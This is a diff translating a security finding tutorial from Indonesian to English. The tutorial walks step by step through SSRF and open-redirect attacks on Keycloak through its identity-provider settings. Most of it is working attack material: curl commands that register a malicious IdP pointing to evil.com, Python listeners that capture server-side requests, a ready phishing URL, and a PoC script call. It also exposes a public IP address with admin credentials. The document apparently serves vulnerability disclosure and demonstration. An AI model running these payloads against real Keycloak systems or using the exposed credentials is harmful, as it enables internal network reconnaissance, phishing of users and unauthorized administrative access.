@@ -1,22 +1,22 @@
 # Tutorial: Finding #4 — SSRF + Open Redirect via Identity Provider
 
 **Severity:** HIGH (CVSS 8.0)
-**Waktu demo:** ~10 menit
-**Kebutuhan:** Terminal + Browser (Admin Console)
+**Demo time:** ~10 minutes
+**Requirements:** Terminal + Browser (Admin Console)
 **3 Attack Paths:** GET SSRF, Open Redirect, POST SSRF
 
 ---
 
-## Skenario Serangan
+## Attack Scenario
 
-Attacker yang punya role `manage-identity-providers` (biasa didelegasikan ke team lead untuk SSO setup) bisa:
-- **Path A:** Scan jaringan internal via SSRF
-- **Path B:** Buat phishing URL dari domain Keycloak yang trusted
-- **Path C:** POST data sensitif ke service internal
+An attacker who has the `manage-identity-providers` role (commonly delegated to team leads for SSO setup) can:
+- **Path A:** Scan internal networks via SSRF
+- **Path B:** Create a phishing URL from a trusted Keycloak domain
+- **Path C:** POST sensitive data to internal services
 
 ---
 
-## Langkah 0: Pastikan Keycloak Berjalan
+## Step 0: Ensure Keycloak is Running
 
 ```bash
 curl -s http://localhost:8080/realms/test | python3 -c "import sys,json; print('Keycloak OK:', json.load(sys.stdin)['realm'])"
@@ -24,7 +24,7 @@ curl -s http://localhost:8080/realms/test | python3 -c "import sys,json; print('
 
 ---
 
-## Langkah 1: Dapatkan Admin Token
+## Step 1: Get Admin Token
 
 ```bash
 ADMIN_TOKEN=$(curl -s -X POST http://localhost:8080/realms/master/protocol/openid-connect/token \
@@ -41,9 +41,9 @@ echo "Token OK: ${ADMIN_TOKEN:0:30}..."
 
 # PATH A: GET SSRF via import-config
 
-## Langkah A1: Siapkan HTTP Listener (Terminal 1)
+## Step A1: Set Up HTTP Listener (Terminal 1)
 
-Buka terminal baru dan jalankan listener untuk menangkap SSRF request:
+Open a new terminal and run a listener to capture the SSRF request:
 
 ```bash
 python3 -c "
@@ -51,7 +51,7 @@ from http.server import HTTPServer, BaseHTTPRequestHandler
 class H(BaseHTTPRequestHandler):
     def do_GET(self):
         print(f'')
-        print(f'=== SSRF TERDETEKSI! ===')
+        print(f'=== SSRF DETECTED! ===')
         print(f'Method: {self.command}')
         print(f'Path:   {self.path}')
         print(f'User-Agent: {self.headers.get(\"User-Agent\")}')
@@ -62,14 +62,14 @@ class H(BaseHTTPRequestHandler):
         self.end_headers()
         self.wfile.write(b'{\"issuer\":\"https://evil.com\"}')
     def log_message(self, *a): pass
-print('Listener siap di port 49990... menunggu SSRF request...')
+print('Listener ready on port 49990... waiting for SSRF request...')
 HTTPServer(('0.0.0.0', 49990), H).serve_forever()
 "
 ```
 
-## Langkah A2: Trigger SSRF (Terminal 2)
+## Step A2: Trigger SSRF (Terminal 2)
 
-Di terminal lain, kirim request import-config dengan `fromUrl` mengarah ke listener kita:
+In another terminal, send an import-config request with `fromUrl` pointing to our listener:
 
 ```bash
 ADMIN_TOKEN=$(curl -s -X POST http://localhost:8080/realms/master/protocol/openid-connect/token \
@@ -84,24 +84,24 @@ curl -s -X POST \
   | python3 -m json.tool
 ```
 
-## Langkah A3: Lihat Listener (Terminal 1)
+## Step A3: Check Listener (Terminal 1)
 
-**Output di listener:**
+**Output on the listener:**
 ```
-=== SSRF TERDETEKSI! ===
+=== SSRF DETECTED! ===
 Method: GET
 Path:   /.well-known/openid-configuration
 User-Agent: Apache-HttpClient/4.5.14 (Java/21.0.10)
 ========================
 ```
 
-> **SSRF CONFIRMED!** Keycloak melakukan server-side HTTP GET ke alamat internal yang kita tentukan. User-Agent menunjukkan ini request dari Java — bukan dari browser user.
+> **SSRF CONFIRMED!** Keycloak performed a server-side HTTP GET to the internal address we specified. The User-Agent shows this is a request from Java — not from the user's browser.
 
 ---
 
 # PATH B: Open Redirect via kc_idp_hint
 
-## Langkah B1: Register Malicious IdP
+## Step B1: Register Malicious IdP
 
 ```bash
 ADMIN_TOKEN=$(curl -s -X POST http://localhost:8080/realms/master/protocol/openid-connect/token \
@@ -127,22 +127,22 @@ curl -s -o /dev/null -w "Register IdP: HTTP %{http_code}\n" -X POST \
 ```
 Output: `Register IdP: HTTP 201`
 
-## Langkah B2: Verifikasi IdP Terdaftar di Admin Console
+## Step B2: Verify IdP is Registered in Admin Console
 
-1. Buka: `http://46.101.162.187:8080/admin/master/console/`
+1. Open: `http://46.101.162.187:8080/admin/master/console/`
 2. Login: `admin` / `Admin1234`
 3. Realm **test** → **Identity providers**
-4. Lihat **attacker-idp** sudah terdaftar dengan `authorizationUrl: https://evil.com/fake-login`
+4. See **attacker-idp** is registered with `authorizationUrl: https://evil.com/fake-login`
 
-## Langkah B3: Buat Phishing URL
+## Step B3: Create Phishing URL
 
-URL ini 100% legitimate Keycloak — tapi akan redirect ke evil.com:
+This URL is 100% legitimate Keycloak — but will redirect to evil.com:
 
 ```
 http://46.101.162.187:8080/realms/test/protocol/openid-connect/auth?client_id=test-public&response_type=code&redirect_uri=http://46.101.162.187:8080/realms/test/account&scope=openid&kc_idp_hint=attacker-idp
 ```
 
-## Langkah B4: Verifikasi Redirect
+## Step B4: Verify Redirect
 
 ```bash
 curl -si "http://46.101.162.187:8080/realms/test/protocol/openid-connect/auth?client_id=test-public&response_type=code&redirect_uri=http://46.101.162.187:8080/realms/test/account&scope=openid&kc_idp_hint=attacker-idp" \
@@ -150,9 +150,9 @@ curl -si "http://46.101.162.187:8080/realms/test/protocol/openid-connect/auth?cl
 ```
 
 > Redirect chain: Keycloak domain → broker → **evil.com/fake-login**
-> Korban melihat URL Keycloak yang trusted, tapi di-redirect ke halaman phishing attacker.
+> The victim sees a trusted Keycloak URL, but gets redirected to the attacker's phishing page.
 
-## Langkah B5: Cleanup IdP (setelah demo)
+## Step B5: Cleanup IdP (after demo)
 
 ```bash
 ADMIN_TOKEN=$(curl -s -X POST http://localhost:8080/realms/master/protocol/openid-connect/token \
@@ -168,9 +168,9 @@ curl -s -o /dev/null -w "Delete IdP: HTTP %{http_code}\n" -X DELETE \
 
 # PATH C: POST SSRF via tokenUrl
 
-## Langkah C1: Siapkan Listener untuk POST (Terminal 1)
+## Step C1: Set Up Listener for POST (Terminal 1)
 
-Kill listener lama dulu, lalu jalankan:
+Kill the old listener first, then run:
 
 ```bash
 python3 -c "
@@ -180,7 +180,7 @@ class H(BaseHTTPRequestHandler):
         length = int(self.headers.get('Content-Length', 0))
         body = self.rfile.read(length).decode()
         print(f'')
-        print(f'=== POST SSRF TERDETEKSI! ===')
+        print(f'=== POST SSRF DETECTED! ===')
         print(f'Method: POST')
         print(f'Path:   {self.path}')
         print(f'Body:   {body}')
@@ -192,12 +192,12 @@ class H(BaseHTTPRequestHandler):
         self.end_headers()
         self.wfile.write(b'{\"error\":\"invalid_grant\"}')
     def log_message(self, *a): pass
-print('Listener siap di port 49991... menunggu POST SSRF...')
+print('Listener ready on port 49991... waiting for POST SSRF...')
 HTTPServer(('0.0.0.0', 49991), H).serve_forever()
 "
 ```
 
-## Langkah C2: Register IdP dengan tokenUrl Internal
+## Step C2: Register IdP with Internal tokenUrl
 
 ```bash
 ADMIN_TOKEN=$(curl -s -X POST http://localhost:8080/realms/master/protocol/openid-connect/token \
@@ -222,17 +222,17 @@ curl -s -o /dev/null -w "Register IdP: HTTP %{http_code}\n" -X POST \
   "http://localhost:8080/admin/realms/test/identity-provider/instances"
 ```
 
-> `tokenUrl` mengarah ke listener kita di `127.0.0.1:49991` — ini target SSRF internal.
+> `tokenUrl` points to our listener at `127.0.0.1:49991` — this is the internal SSRF target.
 
-## Langkah C3: Trigger POST SSRF via Broker Callback
+## Step C3: Trigger POST SSRF via Broker Callback
 
-Ini memerlukan browser session yang aktif. Untuk demo lengkap, buka URL broker endpoint di browser. Keycloak akan POST ke tokenUrl internal saat memproses broker callback.
+This requires an active browser session. For a full demo, open the broker endpoint URL in a browser. Keycloak will POST to the internal tokenUrl when processing the broker callback.
 
-> **Catatan:** Path C memerlukan browser session aktif. Untuk demo video, Path A dan B sudah cukup menunjukkan vulnerability.
+> **Note:** Path C requires an active browser session. For a video demo, Path A and B are sufficient to demonstrate the vulnerability.
 
 ---
 
-## Langkah 9: Jalankan Python PoC (Otomatis Path A + B)
+## Step 9: Run Python PoC (Automated Path A + B)
 
 ```bash
 python3 pocs/poc_f4_ssrf_idp.py --host http://localhost:8080 --listen-port 49990
@@ -240,12 +240,12 @@ python3 pocs/poc_f4_ssrf_idp.py --host http://localhost:8080 --listen-port 49990
 
 ---
 
-## Ringkasan
+## Summary
 
-| Path | Attack | Bukti | Status |
+| Path | Attack | Evidence | Status |
 |---|---|---|---|
-| A: GET SSRF | import-config fromUrl | Listener menerima GET dari Keycloak | VULNERABLE |
-| B: Open Redirect | kc_idp_hint + authorizationUrl | Redirect ke evil.com dari domain trusted | VULNERABLE |
-| C: POST SSRF | tokenUrl via broker callback | POST ke alamat internal | VULNERABLE |
+| A: GET SSRF | import-config fromUrl | Listener receives GET from Keycloak | VULNERABLE |
+| B: Open Redirect | kc_idp_hint + authorizationUrl | Redirect to evil.com from trusted domain | VULNERABLE |
+| C: POST SSRF | tokenUrl via broker callback | POST to internal address | VULNERABLE |
 
-**Kesimpulan:** Attacker dengan role `manage-identity-providers` bisa scan jaringan internal, phishing dari domain trusted, dan POST ke service internal.
+**Conclusion:** An attacker with the `manage-identity-providers` role can scan internal networks, phish from a trusted domain, and POST to internal services.
